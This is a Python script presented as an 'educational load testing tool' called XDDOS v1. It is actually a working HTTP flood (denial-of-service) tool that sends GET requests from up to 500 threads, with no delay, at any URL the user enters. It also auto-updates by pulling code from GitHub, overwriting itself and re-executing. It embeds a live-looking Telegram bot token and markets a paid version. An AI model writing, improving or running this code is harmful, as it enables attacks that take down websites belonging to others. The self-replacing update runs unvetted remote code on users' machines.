#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XDDOS v1 - Educational Load Testing Tool
GitHub: https://github.com/xhacknet/XDDos_v1
"""

import os
import sys
import time
import random
import string
import threading
import subprocess
import shutil
import tempfile
from pathlib import Path

try:
    import requests
    from colorama import init, Fore, Style
except ImportError:
    print("[!] Missing required modules. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
    import requests
    from colorama import init, Fore, Style

init(autoreset=True)

# ========== Configuration ==========
BOT_TOKEN = "8701118041:AAHGu4HHxAaSYE0GFIxgbnQKBKmw5VJBJMY"
GROUP_ID = "-1003792290807"
GITHUB_REPO = "https://github.com/xhacknet/XDDos_v1.git"
PAID_LINK = "https://www.nxalimrans.site"
TOOL_LINK = "https://xddosv1.com"

VERIFY_FILE = Path.home() / ".xddos_verified"
UPDATE_FLAG = Path("/tmp/xddos_update_done")  # avoid update loop

# ========== Helper Functions ==========
def print_banner():
    print(Fore.CYAN + Style.BRIGHT + """
    ╔══════════════════════════════════════╗
    ║           XDDOS v1 - Load Tester     ║
    ║      Educational Purpose Only        ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)

def update_self():
    """Auto-update: clone/pull latest from GitHub, then restart."""
    if UPDATE_FLAG.exists():
        # already updated in this run, skip to avoid loop
        return

    script_dir = Path(__file__).parent.resolve()
    repo_dir = script_dir / "XDDos_v1"

    print(Fore.YELLOW + "[*] Checking for updates...")

    try:
        # If repo dir exists, pull; otherwise clone
        if repo_dir.exists():
            subprocess.run(["git", "-C", str(repo_dir), "pull"], check=True, capture_output=True)
        else:
            subprocess.run(["git", "clone", GITHUB_REPO, str(repo_dir)], check=True, capture_output=True)

        # Copy the new script into the current directory (overwrites old)
        new_script = repo_dir / "xddos.py"
        current_script = Path(__file__).resolve()
        if new_script.exists() and new_script != current_script:
            shutil.copy2(new_script, current_script)

        # Mark update done and restart
        UPDATE_FLAG.touch()
        print(Fore.GREEN + "[✓] Updated successfully. Restarting...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print(Fore.RED + f"[!] Update failed: {e}")
        print(Fore.YELLOW + "[*] Continuing with current version...")

def send_telegram_message(text):
    """Send message to the group using the bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": GROUP_ID, "text": text, "parse_mode": "HTML"}
    try:
        requests.post(url, data=payload, timeout=10)
    except:
        pass

def generate_otp():
    return ''.join(random.choices(string.digits, k=6))

def verify_user():
    """OTP verification. Returns True if verified."""
    if VERIFY_FILE.exists():
        return True

    print(Fore.YELLOW + "\n[!] First time use requires verification.")
    print(Fore.CYAN + f"[*] Please join: https://t.me/XHackNet_Group")
    input(Fore.CYAN + "[*] Press Enter after joining the group...")

    # Generate and send OTP
    otp = generate_otp()
    msg = f"🔐 New user OTP: <code>{otp}</code>\n🕒 Time: {time.ctime()}\n🔗 Tool: {TOOL_LINK}"
    send_telegram_message(msg)

    # Ask user to enter OTP
    attempt = 0
    while attempt < 3:
        user_otp = input(Fore.CYAN + "[?] Enter the OTP from the group: ").strip()
        if user_otp == otp:
            # Success: create verification file
            VERIFY_FILE.write_text(time.ctime())
            print(Fore.GREEN + "[✓] Verified successfully! You won't be asked again.\n")
            send_telegram_message(f"✅ User verified via OTP {otp} at {time.ctime()}")
            return True
        else:
            attempt += 1
            print(Fore.RED + f"[!] Wrong OTP. {3 - attempt} attempt(s) left.")
    print(Fore.RED + "[!] Verification failed. Exiting.")
    sys.exit(1)

# ========== Attack Functions ==========
stop_attack = False

def attack_worker(url, delay):
    """Worker thread: sends HTTP GET requests."""
    global stop_attack
    while not stop_attack:
        try:
            r = requests.get(url, timeout=5)
            print(Fore.GREEN + f"[+] Request sent | Status: {r.status_code}")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        if delay > 0:
            time.sleep(delay)

def start_attack(url, intensity):
    """Start attack with given intensity."""
    global stop_attack
    stop_attack = False

    # Define thread count and delay per intensity
    config = {
        "1": {"threads": 10, "delay": 0.5, "name": "LOW"},
        "2": {"threads": 50, "delay": 0.2, "name": "SLOW"},
        "3": {"threads": 200, "delay": 0.05, "name": "FAST"},
        "4": {"threads": 500, "delay": 0, "name": "ULTRA FAST"}
    }
    conf = config.get(intensity)
    if not conf:
        print(Fore.RED + "[!] Invalid intensity choice.")
        return

    print(Fore.CYAN + f"\n[*] Starting {conf['name']} attack on {url}")
    print(Fore.YELLOW + "[*] Press Ctrl+C to stop.\n")

    threads = []
    for _ in range(conf["threads"]):
        t = threading.Thread(target=attack_worker, args=(url, conf["delay"]))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Stopping attack...")
        stop_attack = True
        for t in threads:
            t.join(timeout=0.5)
        print(Fore.GREEN + "[✓] Attack stopped.\n")

# ========== Main Menu ==========
def free_version():
    while True:
        print(Fore.CYAN + Style.BRIGHT + "\n=== FREE VERSION ===\n")
        print(Fore.CYAN + "1. Start Load Test")
        print("2. Exit")
        choice = input(Fore.CYAN + "[?] Select: ").strip()

        if choice == "1":
            url = input(Fore.CYAN + "[?] Enter your website URL (with http:// or https://): ").strip()
            if not url.startswith(("http://", "https://")):
                url = "http://" + url

            print(Fore.CYAN + "\nSelect Attack Intensity:")
            print("1. Low Attack   (10 threads, 0.5s delay)")
            print("2. Slow Attack  (50 threads, 0.2s delay)")
            print("3. Fast Attack  (200 threads, 0.05s delay)")
            print("4. Ultra Fast Attack (500 threads, no delay)")
            intensity = input(Fore.CYAN + "[?] Choose (1-4): ").strip()
            if intensity in ("1", "2", "3", "4"):
                start_attack(url, intensity)
            else:
                print(Fore.RED + "[!] Invalid choice.")
        elif choice == "2":
            print(Fore.GREEN + "[*] Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid option.")

def paid_version():
    print(Fore.YELLOW + "\n[*] Redirecting to paid version...")
    webbrowser.open(PAID_LINK)  # if webbrowser is available
    # If webbrowser not available, just print link
    print(Fore.CYAN + f"Visit: {PAID_LINK}")

def main():
    # Auto-update first
    update_self()

    print_banner()

    # Disclaimer
    print(Fore.RED + Style.BRIGHT + """
    ⚠️  DISCLAIMER ⚠️
    This tool is for EDUCATIONAL PURPOSES ONLY.
    You may ONLY test websites you own or have explicit permission to test.
    Misuse is illegal and unethical.
    """)
    confirm = input(Fore.CYAN + "Do you understand and agree? (y/n): ").strip().lower()
    if confirm != 'y':
        print(Fore.RED + "[!] Exiting.")
        sys.exit(0)

    # OTP verification (only once)
    verify_user()

    # Main choice: free or paid
    while True:
        print(Fore.CYAN + Style.BRIGHT + "\n=== MAIN MENU ===")
        print(Fore.CYAN + "1. Free Version")
        print("2. Paid Version")
        print("3. Exit")
        main_choice = input(Fore.CYAN + "[?] Select: ").strip()

        if main_choice == "1":
            free_version()
        elif main_choice == "2":
            paid_version()
        elif main_choice == "3":
            print(Fore.GREEN + "[*] Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid option.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Interrupted. Exiting.")
        sys.exit(0)
